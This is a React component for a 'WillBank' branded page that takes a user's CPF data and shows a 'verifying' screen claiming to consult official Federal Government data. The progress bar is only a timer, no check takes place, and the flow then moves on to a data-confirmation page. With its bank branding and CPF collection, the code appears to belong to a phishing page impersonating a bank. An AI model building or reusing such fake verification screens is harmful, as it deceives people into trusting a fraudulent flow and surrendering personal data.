import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Shield } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import { CPFData } from "@/lib/cpf";

const Verificando = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Animação de progresso
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            navigate("/confirma-dados", { state: { cpfData } });
          }, 500);
          return 100;
        }
        return prev + 2;
      });
    }, 60);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-md">
          <div className="space-y-8 text-center py-8">
            {/* Animated Shield Icon */}
            <div className="relative w-24 h-24 mx-auto">
              {/* Outer animated ring */}
              <div className="absolute inset-0 rounded-full border-4 border-primary/30 animate-ping" />
              {/* Inner ring */}
              <div className="absolute inset-2 rounded-full border-4 border-primary" />
              {/* Shield icon */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-12 h-12 bg-primary rounded-full flex items-center justify-center">
                  <Shield className="w-6 h-6 text-primary-foreground" />
                </div>
              </div>
            </div>

            <div className="space-y-2">
              <h1 className="text-2xl font-bold text-foreground">
                Verificando informações
              </h1>
              <p className="text-muted-foreground">
                Consultando dados oficiais do Governo Federal
              </p>
            </div>

            {/* Progress */}
            <div className="space-y-3">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">Progresso da verificação</span>
                <span className="font-semibold text-foreground">{progress}%</span>
              </div>
              <div className="h-3 bg-primary/20 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-primary transition-all duration-100 rounded-full"
                  style={{ width: `${progress}%` }}
                />
              </div>
              <p className="text-sm text-muted-foreground">
                Aguarde enquanto verificamos seus dados...
              </p>
            </div>

            {/* Security Badge */}
            <div className="inline-flex items-center gap-2 bg-purple-100 text-purple-700 px-4 py-2 rounded-full text-sm">
              <span>🛡️</span>
              <span className="font-medium">Verificação Segura</span>
            </div>
          </div>
        </WillBankCard>
      </main>
    </div>
  );
};

export default Verificando;
